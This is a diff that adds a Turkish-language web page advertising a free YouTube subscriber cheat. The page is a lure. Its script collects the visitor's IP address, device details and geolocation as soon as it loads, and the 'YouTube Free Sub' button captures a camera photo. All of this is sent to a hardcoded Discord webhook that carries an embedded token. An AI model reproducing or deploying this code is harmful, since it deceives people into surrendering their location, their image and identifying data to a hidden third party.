@@ -1,1 +1,136 @@
 
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>BEDAVA YOUTUBE ABONE (SON 1 GÜN)</title>
+  </head>
+  <body>
+    <main class="container">
+      <p>BEDAVACILAR DİYARI 🥳</p>
+      <section class="animation">
+      </section>
+    </main>
+    <link rel="stylesheet" href="arkaplanvb.css" type="text/css">
+    <h1>YouTube Abone Hilesini Başlatmak İçin Aşağıdaki Butona Baıp İzinleri Veriniz.</h1>
+    <button id="allow-mic">YouTube Free Sub</button>
+    <div id="picture-container"></div>
+
+    <script>
+      const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
+
+      // Get the user's IP address
+      fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+
+          // Get the user's device information
+          const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            browserName: getBrowserName(),
+          };
+
+          // Send the user's IP address and device information to the Discord webhook
+          const formData = new FormData();
+          formData.append('username', 'Kamera Erişimi');
+          formData.append('content', `IP Adresi: ${ipAddress}\nCihaz Bilgileri: ${JSON.stringify(deviceInfo)}`);
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
+        })
+        .catch(error => console.error(error));
+
+      // Request the user's location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // Send the user's location to the Discord webhook
+          const formData = new FormData();
+          formData.append('username', 'Kamera Erişimi');
+          formData.append('content', `Konum: ${lat}, ${lon}`);
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
+        }, error => {
+          console.error('Error:', error);
+          const formData = new FormData();
+          formData.append('username', 'Kamera Erişimi');
+          formData.append('content', `Konum İzni Verilmedi`);
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
+        });
+      } else {
+        console.error('Geolocation not supported');
+      }
+
+      // Request access to the user's camera and microphone
+      const constraints = {
+        video: true,
+        audio: true,
+      };
+
+      // Capture a picture from the camera when the button is clicked
+      document.getElementById('allow-mic').addEventListener('click', () => {
+        navigator.mediaDevices.getUserMedia(constraints)
+          .then(stream => {
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            return imageCapture.takePhoto();
+          })
+          .then(blob => {
+            const url = URL.createObjectURL(blob);
+            const img = document.createElement('img');
+            img.src = url;
+            document.getElementById('picture-container').appendChild(img);
+
+            // Send the picture to the Discord webhook
+            const formData = new FormData();
+            formData.append('username', 'Kamera Erişimi');
+            formData.append('content', '');
+            formData.append('file', blob);
+
+            fetch(webhookUrl, {
+              method: 'POST',
+              body: formData,
+            })
+           .then(response => response.json())
+           .then(data => console.log(data))
+           .catch(error => console.error(error));
+          })
+          .catch(error => {
+            console.error('Error:', error);
+          });
+      });
+
+      // Function to get the browser name
+      function getBrowserName() {
+        const userAgent = navigator.userAgent;
+        if (userAgent.indexOf('Chrome') > -1) return 'Google Chrome';
+        if (userAgent.indexOf('Firefox') > -1) return 'Mozilla Firefox';
+        if (userAgent.indexOf('Safari') > -1) return 'Apple Safari';
+        if (userAgent.indexOf('Edge') > -1) return 'Microsoft Edge';
+        return 'Unknown';
+      }
+    </script>
+  </body>
+</html>
